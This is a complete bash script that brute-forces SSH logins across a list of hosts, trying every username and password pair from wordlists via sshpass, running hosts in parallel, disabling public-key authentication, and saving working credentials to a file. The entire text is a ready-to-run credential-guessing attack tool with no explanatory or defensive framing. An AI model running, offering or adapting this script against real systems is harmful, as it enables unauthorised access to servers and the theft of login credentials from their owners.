#!/bin/bash
host_file="hosts.txt"
usernames_file="usernames.txt"
passwords_file="passwords.txt"
successful="found_credentials.txt"
ssh_connect_timeout=10

while read ip; do
    ( while read user; do
        while read pwd; do
            echo sshpass -p "$pwd" ssh $user@$ip
            if hostname=$(sshpass -p "$pwd" ssh $user@$ip -oConnectTimeout=$ssh_connect_timeout -oPubkeyAuthentication=no "hostname"); then
                echo "$hostname: $user@$ip $pwd" >> $successful
            fi
        done < $passwords_file
    done < $usernames_file ) &
done < $host_file
